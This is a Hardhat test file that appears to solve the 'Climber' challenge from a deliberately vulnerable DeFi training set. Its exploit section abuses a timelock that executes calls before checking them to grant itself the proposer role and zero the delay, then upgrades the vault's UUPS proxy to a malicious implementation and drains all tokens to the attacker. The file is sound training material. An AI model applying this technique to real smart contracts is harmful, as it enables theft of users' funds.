const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Climber", function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther("10000000");

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(await ethers.provider.getBalance(attacker.address)).to.equal(
            ethers.utils.parseEther("0.1")
        );

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory("ClimberVault", deployer),
            [deployer.address, proposer.address, sweeper.address],
            { kind: "uups" }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt("0");
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);

        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory("ClimberTimelock", deployer)
        ).attach(timelockAddress);

        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (
            await ethers.getContractFactory("DamnValuableToken", deployer)
        ).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */
        const exploit = await (
            await ethers.getContractFactory("ClimberExploit")
        ).deploy(this.timelock.address);
        const proxyExploit = await (
            await ethers.getContractFactory("ClimberProxyExploit")
        ).deploy();
        const proposerRole = await this.timelock.PROPOSER_ROLE();
        const standardBytes32 = ethers.utils.hexZeroPad("0x0", 32);
        const encoded = new ethers.utils.Interface([
            "function grantRole(bytes32,address)",
            "function withdraw(address,address)",
            "function updateDelay(uint64)",
            "function upgradeTo(address)",
            "function start()",
        ]);

        const encode1 = encoded.encodeFunctionData("grantRole", [
            proposerRole,
            exploit.address,
        ]);
        const encode2 = encoded.encodeFunctionData("start", []);
        const encode3 = encoded.encodeFunctionData("updateDelay", [0]);
        await this.timelock
            .connect(attacker)
            .execute(
                [this.timelock.address, this.timelock.address, exploit.address],
                [0, 0, 0],
                [encode1, encode3, encode2],
                standardBytes32
            );

        const proxyEncode = encoded.encodeFunctionData("upgradeTo", [proxyExploit.address]);
        const proxyEncode2 = encoded.encodeFunctionData("withdraw", [
            this.token.address,
            attacker.address,
        ]);
        await exploit
            .connect(attacker)
            .makeCall(
                [this.vault.address, this.vault.address],
                [0, 0],
                [proxyEncode,proxyEncode2],
                standardBytes32
            );
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq("0");
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
